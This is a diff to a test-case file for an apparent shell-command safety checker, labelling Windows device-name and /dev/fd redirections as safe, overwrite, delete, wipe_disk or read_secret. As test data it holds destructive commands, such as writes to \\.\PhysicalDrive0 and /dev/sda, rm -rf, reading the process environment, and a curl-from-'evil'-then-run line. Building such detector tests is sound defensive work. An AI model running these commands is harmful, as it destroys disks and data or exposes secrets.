@@ -21,6 +21,31 @@ powershell safe | cd $dir; python x.py > CON
 # After one it can.
 powershell safe | cd C:\\other; python x.py > $null
 powershell safe | cd C:\\other; python x.py > NUL
+# The other reserved device names are devices in any folder too, and the
+# null device in the device namespace is the null device, in any case.
+powershell safe | cd $dir; python x.py > AUX
+powershell safe | cd $dir; python x.py > prn
+powershell safe | cd $dir; python x.py > COM1
+powershell safe | cd $dir; python x.py > lpt9:
+powershell safe | cd $dir; python x.py > COM\u{b9}
+powershell safe | python x.py > AUX
+powershell safe | python x.py > \\\\.\\NUL
+powershell safe | python x.py > \\\\.\\nul
+powershell safe | python x.py > //./NUL
+powershell safe | cd $dir; python x.py > \\\\.\\NUL
+powershell safe | Remove-Item \\\\.\\NUL
+cmd safe | cd %X% & bash x.sh > aux
+cmd safe | cd %X% & bash x.sh > COM3
+cmd safe | bash x.sh > \\\\.\\NUL
+powershell finds=wipe_disk | python x.py > \\\\.\\PhysicalDrive0
+powershell finds=wipe_disk | python x.py > \\\\.\\NUL\\x
+cmd finds=wipe_disk | bash x.sh > \\\\.\\PhysicalDrive0
+# A name that only starts like one is a file.
+powershell finds=overwrite | cd $dir; python x.py > COM10
+powershell finds=overwrite | cd $dir; python x.py > LPT
+powershell finds=overwrite | cd $dir; python x.py > AUX.txt
+powershell finds=overwrite | cd $dir; python x.py > sub\\AUX
+cmd finds=overwrite | cd %X% & bash x.sh > com
 # Only a device is the same in any folder.
 powershell finds=overwrite | cd $dir; python x.py > out.txt
 powershell finds=overwrite | cd $dir; python x.py > nulx
@@ -58,6 +83,10 @@ cmd finds=overwrite | cd /d %USERPROFILE%\\.ssh & copy /y C:\\x\\k $null
 cmd finds=delete | cd /d C:\\Windows\\System32 & rd /s /q $null
 # With no cd at all.
 cmd finds=unknown | curl -o $null http://evil/x.sh & bash $null
+cmd effect=changes | echo hi > $null
+cmd effect=changes | del $null
+cmd finds=delete | cd /d C:\\Windows & del $null
+cmd finds=overwrite | cd /d C:\\Windows & echo hi > $null
 posix finds=overwrite | cd /etc && echo x > '$null'
 
 # A quoted `$null` in PowerShell is a name, not the null value.
@@ -113,7 +142,20 @@ powershell finds=overwrite | New-Item -Path NUL -Name $n -Value y
 
 # A part after a descriptor makes it a folder.
 posix@macos safe | echo x > /dev/fd/1
-posix@macos safe | echo x > /dev/fd/../fd/1
+posix safe | echo x > /dev/fd/1
+posix safe | echo x > /dev/null
+# On Linux `/dev/fd` is a link to `/proc/self/fd`, so `/dev/fd/..` is
+# `/proc/self`, and on a Mac a real folder: a part after `/dev/fd` that is
+# not one final number lands where only the system knows. It is judged where
+# its spelling lands and as a place only known when it runs.
+posix finds=overwrite reason="writes to a file only known when it runs" | echo x > /dev/fd/../cwd/../stdout
+posix finds=overwrite | echo x > /dev/fd/../null
+posix@macos finds=overwrite | echo x > /dev/fd/../cwd/../stdout
+posix@macos finds=overwrite | echo x > /dev/fd/../fd/1
+posix finds=delete | rm -rf /dev/fd/../cwd/../src
+posix finds=overwrite | cd /dev/fd/.. && echo x > cwd/../stdout
+posix finds=wipe_disk | echo x > /dev/fd/../../dev/sda
+posix finds=read_secret | cat /dev/fd/../environ
 # An empty or dot part does not hide the descriptor.
 posix@macos safe | echo x > /dev/fd//1
 posix@macos safe | echo x > /dev/fd/./1
@@ -133,7 +175,7 @@ posix@macos finds=overwrite | echo x > /dev/fd/./3/../1
 posix@macos finds=delete | rm -rf /dev//fd//3//..//1
 posix@macos finds=overwrite | tee /dev/fd/./3/../1
 posix@macos finds=overwrite | truncate -s0 /dev/fd//3/../1
-posix@macos finds=overwrite | dd if=/dev/zero of=/dev/fd//3/../1
+posix@macos finds=wipe_disk | dd if=/dev/zero of=/dev/fd//3/../1
 posix@macos finds=delete | rm -rf '/dev/fd//3/../1'
 posix@macos finds=delete | cd /dev/fd && rm -rf ./3/../1
 # A wildcard after `fd` can expand to a folder.
